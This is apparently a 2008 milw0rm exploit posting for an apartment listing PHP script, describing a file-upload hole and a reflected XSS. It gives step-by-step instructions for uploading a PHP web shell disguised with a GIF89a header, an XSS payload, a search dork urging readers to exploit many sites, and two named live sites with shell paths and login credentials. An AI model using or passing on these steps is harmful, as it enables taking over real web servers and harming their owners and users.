@@ -1,0 +1,133 @@
+[~] Apartment Search Script Multiple Remote Vuln.
+[~]
+[~] Remote File Upload & XSS
+[~]
+[~] ----------------------------------------------------------
+[~] Discovered By: ZoRLu
+[~]
+[~] Date: 02.11.2008
+[~]
+[~] Home: www.z0rlu.blogspot.com
+[~]
+[~] contact: trt-turk@hotmail.com
+[~]
+[~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( (
+[~] 
+[~] dork: allinurl:"listtest.php?r=" ( cok site var sömürün : ) )
+[~]
+[~] ----------------------------------------------------------
+
+exploit:
+
+http://localhost/script_path/Member_Admin/logo/[id]your_shell.php
+
+XSS
+
+http://localhost/script_path/listtest.php?r="><script>alert()</script>
+
+example 1 (demo):
+
+http://www.downlinegoldmine.com/apartment/Member_Admin/logo/b50f9cbff100ae4e8a581a9f1a8shell.php
+
+example 2:
+
+http://www.apt.cc/Member_Admin/logo/cca55760b985b02c1b9d7fac606shell.php
+
+XSS example:
+
+http://www.apt.cc/listtest.php?r="><script>alert()</script>
+
+---------------------------------------------------------------------------
+
+you must have a minimal shell ( example 40 kb ) (kucuk bir shell in olmalI )
+
+and you add this code your shell to head 
+
+GIF89a; (en uste bu kodu ekle )
+
+example your_shell.php:
+
+GIF89a;
+<?
+
+...
+
+...
+
+...
+
+?>
+
+and save your_sheell.php ( isim ver ve kaydet )
+
+----------------------------------------------------------------------------
+
+you must register to site ( direckt register link: http://localhost/script_path/registerlandlord.php ) ( siteye uye ol )
+
+and login ( direckt link: http://localhost/script_path/Member_Admin/index.php ) ( giris yap )
+
+after edit your banner ( direckt link: http://localhost/script_path/Member_Admin/editimage.php?clientid=[MemberAdminPass] )
+
+or first click "Edit Account Info" after click "Your Logo" Edit button ( "Edit Account Info" yazýsýna tIkla sonra da edit butonuna tIkla )
+
+and open new page. you click gozat button and select your_sheell.php ( acIlan yeni sayfada senin hazIr shell i upload et )
+
+after click to submit button. you should see "Your image will be review." ( "Your image will be review." bu yazIyI gormelisin )
+
+if you see "Your image will be review." your shell upload succesfull. ( gorduysen yukleme basarIlI )
+
+after repeat click to "Edit Account Info" and open page. your logo right click and properties select this link copy
+
+after paste your explorer go your_shell.php ( sonra yine "Edit Account Info" yazIsIna Týkla 
+
+acIlan sayfada logonun ustunde sag tIkla ozellikleri Týkla linki kopyala sonrada shelle ulas )
+
+
+your_shell.php
+
+http://localhost/script_path/Member_Admin/logo/[id]your_shell.php
+
+-------------------------------------------------------------------------------
+
+example 1 (demo):
+
+http://www.downlinegoldmine.com/apartment/Member_Admin/index.php 
+
+email: zorlu@w.cn
+
+password: 123456
+
+or direckt going: http://www.downlinegoldmine.com/apartment/Member_Admin/login.php?c=4806666
+
+edit logo: http://www.downlinegoldmine.com/apartment/Member_Admin/editimage.php?clientid=4806666
+
+and shell.php
+
+http://www.downlinegoldmine.com/apartment/Member_Admin/logo/b50f9cbff100ae4e8a581a9f1a8shell.php
+
+
+example 2:
+
+http://www.apt.cc/Member_Admin/index.php
+
+email: zorlu@w.cn
+
+password: 123456
+
+or direckt going: http://www.apt.cc/Member_Admin/login.php?c=4871187
+
+edit logo: http://www.apt.cc/Member_Admin/editimage.php?clientid=4871187
+
+and shell.php
+
+http://www.apt.cc/Member_Admin/logo/cca55760b985b02c1b9d7fac606shell.php
+
+
+[~]----------------------------------------------------------------------
+[~] Greetz tO: str0ke & all Muslim HaCkeRs
+[~]
+[~] yildirimordulari.org  &  darkc0de.com
+[~]
+[~]----------------------------------------------------------------------
+
+# milw0rm.com [2008-11-02]
